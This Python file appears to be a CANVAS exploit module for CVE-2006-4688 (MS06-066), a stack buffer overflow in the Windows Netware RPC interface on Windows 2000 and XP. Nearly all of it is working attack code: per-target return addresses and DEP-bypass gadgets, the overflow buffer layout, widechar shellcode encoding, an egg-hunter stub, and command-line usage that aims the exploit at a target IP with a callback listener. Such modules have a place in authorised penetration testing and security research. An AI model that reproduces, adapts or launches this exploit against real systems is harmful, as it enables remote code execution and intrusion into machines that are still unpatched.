#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2006-2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')
import struct

from exploitutils import *
from MOSDEF import mosdef
from msrpcexploit import msrpcexploit
from libs.newsmb.libdcerpc import s_dce_raw_unistring, s_dce_win2k_unistring

# GUI info
NAME='Microsoft Netware RPC Interface Overflow'
DESCRIPTION='Microsoft Netware RPC Interface Stack Overflow'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='11-14-2006'
DOCUMENTATION['CVE Name'] = 'CVE-2006-4688'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4688'
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION['Repeatability']='One shot'
DOCUMENTATION['Note']=''
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/bulletin/ms06-066.mspx'
VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP']
PROPERTY['MSADV']='MS06-066'

CHANGELOG="""
"""

NOTES="""
Tested on:
Windows 2000 Advanced Server SP4 English UP2DATE
Windows XP Professional SP1a French OOTB
Windows XP Professional SP2 English OOTB with DEP

Usage:
./commandlineInterface.py -p 5555 -v 1 -i fromcreatethread
./exploits/ms06_066/ms06_066.py -t 10.10.11.20 -v 1 -l 10.10.11.1 -d 5555

So one of the vulnerabilities lies in _NwNdsOpenTreeHandle@8 in nwapi32.dll.
You can reach it through many different opnums on the NwWks RPC interface.
Since it is called from NwrOpenEnumCommon, you can get there using:
- NwrOpenEnumContextInfo
- NwrOpenEnumVolumes
- NwrOpenEnumNdsSubTrees_Disk
- NwrOpenEnumNdsSubTrees_Print
- NwrOpenEnumNdsSubTrees_Any #we are using this one, the stub is simple enough
- NwrOpenEnumQueues
- NwrOpenEnumVolumesQueues
- NwrOpenEnumDirectories
It is also called directly from:
- NwrChangePassword

There is some other stuff patched in _NwNdsResolveName@24, with a length check
added, I will look into that later.
"""

targets={
    0: ['Autoversioning (except for XP SP2)',[]],
    1: ['Windows 2000 SP4, XP SP1a',[0x001f5028,0x00225028]], #jmp esp in some NLS file
    2: ['Windows XP SP2 English (with DEP)',[0x6f895630,0x7c952080,0x7c91d3f8,0x201b0b9a]],
    3: ['Windows XP SP2 French (with DEP)',[0x595c5630,0x7c962080,0x7c92d3f8,0x201dd79e]],
    #4: ['Windows XP SP2 Japanese (with DEP)',[0x42424242,0x42424242,0x42424242,0x42424242]]
}


class theexploit(msrpcexploit):
    def __init__(self):
        msrpcexploit.__init__(self)
        self.name           = NAME
        self.version        = 0
        self.badstring      = '\0\xff'
        self.UUID           = u'e67ab081-9844-3521-9d32-834f038001c0'
        self.uuidversion    = u'1.0'
        self.targetfunction = 9 #NwrOpenEnumNdsSubTrees_Any
        self.autoversion    = 1
        self.subesp         = 3000
        self.listenerArgsDict['fromcreatethread']=1
   
    def testOS(self):
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)
        print 'target=%s->%s'%(self.target,app.target)
        result=app.run()
        if result==0:
            self.log('Unknown OS, automatic detection failed (try choosing a version)')
            return 0
        if app.result.find('2000')>-1:
            self.version=1
            return 1
        elif app.result.find('XP')>-1:
            self.version=1
            return 1
        else:
            self.log('OS not vulnerable: %s'%(result))
        return 0
    
    def buildConnectionList(self):
        host=self.host
        connectionList=['ncacn_np:%s[\\browser]'%(host),\
                        'ncacn_ip_tcp:%s[%d]'%(host, self.port),\
                        'ncacn_ip_tcp:%s[1026]'%(host),\
                        'ncacn_ip_tcp:%s[1027]'%(host),\
                        'ncacn_ip_tcp:%s[1028]'%(host)]
        connectionList+=self.searchifids()
        connectionList=uniquelist(connectionList)
        self.connectionList=connectionList
        return self.connectionList

    def wc_encodeshellcode(self,rawshellcode):
        self.log('Using widechar encoder')
        self.log('Initial shellcode is %d long'%(len(rawshellcode)))
        from encoder import widechar
        encoder=widechar.widechar_chunkedaddencoder()
        encoder.setbadstring(widechar.wcsupr_bad)
        data=encoder.encode(rawshellcode)
        if data=='':
            self.log('Fatal error - could not encode shellcode!')
            raise Exception,'Could not encode shellcode'
        self.log('Final shellcode is %d long'%(len(data)))
        return data

    def encodeshellcode(self,rawshellcode):
        self.shellcode=self.wc_encodeshellcode(rawshellcode)
        return self.shellcode

    def buildDcePacket(self):
        self.info,self.eip=targets[self.version]
        data=''
        packet=''
        data+='\\\0\\\0'

        if self.version==1: #Windows 2000 SP4, XP SP1a
            bufferXP='A'*(0xf048-0xef20)
            bufferXP+=struct.pack('<L',self.eip[1]) #eip XP
            bufferXP+='C'*8
            data+=bufferXP
            buffer2K=self.shellcode
            buffer2K+='D'*(0xf1d0-0xeccc-len(self.shellcode)-len(bufferXP))
            buffer2K+=struct.pack('<L',self.eip[0]) #eip 2000
            buffer2K+='F'*8
            buffer2K+=mosdef.assemble('jmp $-%d'%(len(buffer2K)+5),'x86') #jmp back
            data+=buffer2K
            if (len(data)%2)==1:
                data+='G'
            data+='\\\0H\0'

            packet+=intel_order(1)
            packet+=s_dce_win2k_unistring('F')
            packet+=s_dce_raw_unistring(data)
            packet+=intel_order(0)

        elif self.version>=2: #XP SP2 with DEP
            from shellcode import shellcodeGenerator
            sc=shellcodeGenerator.win32()
            sc.addAttr('SmallSearchCode',{'tag':0x6b303063}) #'c00k'
            sc.standalone=1
            searchcode=self.wc_encodeshellcode(sc.get())

            bufferXP=searchcode
            bufferXP+='A'*(0xf000-0xeeec-len(bufferXP))
            bufferXP+=mosdef.assemble('jmp $-%d'%(len(bufferXP)+5),'x86') #jmp back
            bufferXP+='B'*(0xf014-0xeeec-len(bufferXP))
            bufferXP+=struct.pack('<L',self.eip[0])
            bufferXP+='C'*8
            bufferXP+=struct.pack('<L',self.eip[1])
            bufferXP+=struct.pack('<L',self.eip[3])
            bufferXP+='D'*16
            bufferXP+=struct.pack('<L',self.eip[2])
            bufferXP+='E'*4
            bufferXP+='\xeb\xd6' #esi is restored from here, jmp back
            data+=bufferXP
            data+='\\\x00F\x00'
            if (len(self.shellcode)%2)==1:
                self.shellcode+='G'

            packet+=intel_order(1)
            packet+=s_dce_raw_unistring('c00k'+self.shellcode)
            packet+=s_dce_raw_unistring(data)
            packet+=intel_order(0)

        return packet
    
    def displayVersions(self):
        i=0
        for listline in targets.values():
            print '%d: %s'%(i,listline[0])
            i=i+1
    
if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
